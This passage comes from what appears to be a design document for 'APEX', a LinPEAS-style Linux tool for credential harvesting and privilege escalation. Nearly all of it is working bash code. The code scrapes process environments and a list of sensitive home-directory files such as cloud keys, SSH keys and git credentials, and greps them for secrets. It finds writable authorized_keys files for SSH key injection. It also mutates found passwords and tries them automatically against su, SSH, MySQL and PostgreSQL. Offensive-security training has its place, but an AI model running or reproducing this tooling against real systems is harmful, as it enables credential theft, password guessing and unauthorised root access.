        tr '\0' '\n' < "${pid}environ" 2>/dev/null | \
            grep -E "$CRED_VARS" | while read var; do
                echo "CRED:PROC_ENV:uid_${uid:-?}:$var:${pid}environ"
            done
    done
    
    # Also: processes with interesting names may dump credentials
    # gnome-keyring, sshd, vsftpd, lightdm listed in LinPEAS as processesDump
    for cred_proc in "gnome-keyring-daemon" "lightdm" "sshd:"; do
        for pid in /proc/[0-9]*/; do
            local cmdline
            cmdline=$(cat "${pid}cmdline" 2>/dev/null | tr '\0' ' ')
            echo "$cmdline" | grep -q "$cred_proc" && {
                echo "CRED:CREDENTIAL_PROCESS:root:$cred_proc:${pid}cmdline"
                # Note: actual memory dump requires ptrace or /proc/PID/mem access
                # which needs CAP_PTRACE or same-uid. APEX notes this as manual step.
            }
        done
    done
}
```

---

## SECTION 10: HOT FILES LIST (LinPEAS INT_HIDDEN_FILES Style)

### All Sensitive Files To Check In Every Home Directory

```bash
# These file names are ALWAYS interesting — check every home dir
HOT_FILES_LIST="
.Xauthority
.aws/credentials
.azure/azureProfile.json
.bluemix/config.json
.boto
.claude.json
.cloudflared/cert.pem
.credentials.json
.docker/config.json
.erlang.cookie
.ftpconfig
.git-credentials
.gitconfig
.gnupg/
.google_authenticator
.gpg
.htpasswd
.irssi/config
.kdbx
.kube/config
.ldaprc
.msmtprc
.mylogin.cnf
.netrc
.npmrc
.ovpn
.password-store/
.pgpass
.pypirc
.rdg
.rhosts
.roadtools_auth
.ssh/
.svn/entries
.vault-token
.viminfo
.wgetrc
.zsh_history
.bash_history
"

scan_hot_files() {
    # Check all home directories + /root
    local home_dirs="/root"
    while IFS=: read _ _ uid _ _ home _; do
        [ "$uid" -ge 1000 ] && home_dirs="$home_dirs $home"
    done < /etc/passwd
    home_dirs="$home_dirs $HOME"
    
    for homedir in $home_dirs; do
        [ -d "$homedir" ] || continue
        for hotfile in $HOT_FILES_LIST; do
            local target="$homedir/$hotfile"
            if [ -r "$target" ] || [ -d "$target" ]; then
                echo "CRED:HOT_FILE:$(basename $homedir):found:$target"
                # Read files (not dirs) for content
                [ -f "$target" ] && grep -iE "pass|secret|token|key|auth" "$target" \
                    2>/dev/null | head -3 | while read line; do
                        echo "CRED:HOT_FILE_CONTENT:$(basename $homedir):$line:$target"
                    done
            fi
        done
    done
}
```

---

## SECTION 11: WRITABLE SSH authorized_keys = Lateral Movement

### This Is A Separate Attack Path, Not Just Credential Collection

```bash
check_ssh_key_injection() {
    
    # For each user's authorized_keys — can we WRITE to it?
    while IFS=: read user _ uid _ _ home _; do
        local authkeys="${home}/.ssh/authorized_keys"
        
        # Case 1: File exists and is writable
        if [ -f "$authkeys" ] && [ -w "$authkeys" ]; then
            register_finding "SSH_KEY_INJECT" "$authkeys" \
                "authorized_keys writable for user $user — inject our SSH pubkey" \
                95 "ssh_inject"
            # Generate exploit:
            # cat ~/.ssh/id_rsa.pub >> $authkeys
            # OR: generate new key pair on attacker, inject pub, ssh in with priv
        fi
        
        # Case 2: .ssh directory writable (can create authorized_keys)
        if [ -d "${home}/.ssh" ] && [ -w "${home}/.ssh" ] && [ ! -f "$authkeys" ]; then
            register_finding "SSH_DIR_WRITABLE" "${home}/.ssh" \
                ".ssh directory writable for $user — can create authorized_keys" \
                90 "ssh_inject"
        fi
        
        # Case 3: Home directory writable (can create .ssh and authorized_keys)
        if [ -d "$home" ] && [ -w "$home" ] && [ ! -d "${home}/.ssh" ]; then
            register_finding "HOME_DIR_WRITABLE" "$home" \
                "Home directory writable for $user — create .ssh/authorized_keys" \
                85 "ssh_inject"
        fi
        
    done < /etc/passwd
    
    # If root's authorized_keys is injectable → immediate root
    local root_authkeys="/root/.ssh/authorized_keys"
    if [ -w "$root_authkeys" ] || ([ -w "/root/.ssh" ] && [ ! -f "$root_authkeys" ]); then
        register_finding "SSH_ROOT_INJECT" "$root_authkeys" \
            "CRITICAL: Can inject SSH key for root — instant root access" \
            99 "ssh_root_inject"
    fi
}
```

---

## SECTION 12: CREDENTIAL DNA — What Happens After Finding a Credential

### The Full Propagation Algorithm

```bash
propagate_credential() {
    local username="$1"
    local password="$2"
    local source_type="$3"
    local source_file="$4"
    
    log_info "CREDENTIAL DNA: found ${username}:${password} from $source_type"
    
    # Generate mutations
    local mutations=()
    mutations+=("$password")
    mutations+=("${password^}")           # Capitalize first
    mutations+=("${password^^}")          # ALL CAPS
    mutations+=("${password,,}")          # all lower
    mutations+=("${password}1")
    mutations+=("${password}123")
    mutations+=("${password}!")
    mutations+=("${password}2024")
    mutations+=("${password}2025")
    mutations+=("${password}@")
    # l33t speak
    local leet="$password"
    leet="${leet//a/4}"; leet="${leet//e/3}"; leet="${leet//i/1}"; leet="${leet//o/0}"
    mutations+=("$leet")
    # Remove trailing numbers, try different
    local stripped="${password%%[0-9]*}"
    [ "$stripped" != "$password" ] && mutations+=("$stripped")
    
    for mutation in "${mutations[@]}"; do
        [ -z "$mutation" ] && continue
        test_credential_everywhere "$username" "$mutation" "$source_file"
        # Also test as other local users
        test_credential_su_all "$mutation"
    done
}

test_credential_everywhere() {
    local user="$1"
    local pass="$2"
    local source="$3"
    
    # Test su (requires expect or pty trick)
    test_su_credential "root" "$pass"
    test_su_credential "$user" "$pass"
    
    # Test SSH to localhost
    if command -v sshpass >/dev/null 2>&1; then
        if safe_run 5 sshpass -p "$pass" ssh -o StrictHostKeyChecking=no \
                -o ConnectTimeout=3 "${user}@127.0.0.1" id >/dev/null 2>/dev/null; then
            register_finding "CRED_SSH_VALID" "$user:$pass" \
                "SSH login valid for $user" 92 "cred_dna"
        fi
        # Also test root
        if safe_run 5 sshpass -p "$pass" ssh -o StrictHostKeyChecking=no \
                -o ConnectTimeout=3 "root@127.0.0.1" id >/dev/null 2>/dev/null; then
            register_finding "CRED_SSH_ROOT" "root:$pass" \
                "SSH root login VALID — instant root" 99 "cred_dna"
        fi
    fi
    
    # Test MySQL
    if safe_run 3 mysql -u root -p"$pass" -e "select 1" >/dev/null 2>/dev/null; then
        register_finding "CRED_MYSQL" "root:$pass" \
            "MySQL root access with this password" 88 "cred_dna"
    fi
    
    # Test PostgreSQL
    if safe_run 3 psql -U postgres -w -c "select 1" \
            "postgresql://postgres:${pass}@127.0.0.1" >/dev/null 2>/dev/null; then
        register_finding "CRED_POSTGRES" "postgres:$pass" \
            "PostgreSQL access with this password" 85 "cred_dna"
    fi
}

test_su_credential() {
    local user="$1"
    local pass="$2"
    
    # Requires expect for automated su testing
    if command -v expect >/dev/null 2>&1; then
        local result
        result=$(expect -c "
set timeout 5
spawn su - $user
expect {
    \"Password:\" { send \"$pass\r\"; exp_continue }
    \"\\\$\" { puts SUCCESS_USER; exit 0 }
    \"#\" { puts SUCCESS_ROOT; exit 0 }
    \"failure\" { exit 1 }
    \"incorrect\" { exit 1 }
    timeout { exit 1 }
}
" 2>/dev/null)
        echo "$result" | grep -q "SUCCESS_ROOT" && \
            register_finding "CRED_SU_ROOT" "root:$pass" \
                "su - root valid with this password — IMMEDIATE ROOT" 99 "cred_su"
        echo "$result" | grep -q "SUCCESS_USER" && \
            register_finding "CRED_SU_USER" "$user:$pass" \
                "su - $user valid with this password" 88 "cred_su"
    fi
}
```

---

## WHAT APEX DOES THAT NO OTHER TOOL DOES WITH CREDENTIALS

```
1. SSH agent socket hijacking detection
   → No other tool checks for accessible SSH_AUTH_SOCK belonging to other users

2. authorized_keys WRITABLE → generates exact key injection exploit
   → LinPEAS shows it as interesting finding, APEX generates the attack

3. Git history mining with actual credential extraction
   → LinPEAS just shows git repos exist, APEX reads git log for leaked creds

4. Cloud IMDS detection with automatic role enumeration
   → APEX checks all three major clouds, extracts role names

5. Terraform state credential extraction
   → .tfstate is often world-readable and contains every provisioned password

6. Credential DNA propagation with su testing
   → Only APEX tests found password against su, SSH, MySQL, PostgreSQL automatically

7. KeePass process detection + memory dump hint
   → APEX detects KeePass running and directs student to /proc/$pid/mem approach

8. Process environment scanning for ALL credential variable names (300+)
   → Not just PASS/PASSWORD but every known API key variable name

9. SSL private key findability
   → Other tools focus on SSH keys. APEX finds all PEM/P12/JKS files too.
```

---

## SUMMARY: CREDENTIAL DETECTION COVERAGE AFTER THIS FILE

| Category | Before | After |
|----------|--------|-------|
| SSH private keys | ✓ basic | ✓ + agent hijack + passphrase check |
| SSH authorized_keys | ✗ | ✓ writable = exploit generated |
| SSH known_hosts/config | ✗ | ✓ pivot map extracted |
| History file content | ✓ dump | ✓ + grep credential patterns |
| /proc/environ | ✓ basic | ✓ + 300 variable name patterns |
| Cloud (AWS/GCP/Azure) | ✗ | ✓ files + IMDS |
| Terraform state | ✗ | ✓ extracted credential values |
| Docker/Kubernetes | ✗ | ✓ .docker/config.json + kubeconfig |
| Git history | ✗ | ✓ log + stash + remote URLs |
| KeePass/password managers | ✗ | ✓ find + process detection |
| Database credentials | ✓ basic | ✓ + PostgreSQL + MongoDB auth test |
| Web app configs | ✓ basic | ✓ + 20 config file names |
| SSL/TLS private keys | ✗ | ✓ PEM/P12/JKS/OVPN |
| Jenkins/Ansible | ✗ | ✓ credentials.xml + vault |
| Network creds (.netrc, .pgpass) | ✗ | ✓ full coverage |
| Credential DNA propagation | ✓ basic | ✓ + su testing + full mutations |
| Hot files scan | ✗ | ✓ 50+ known sensitive filenames |
```
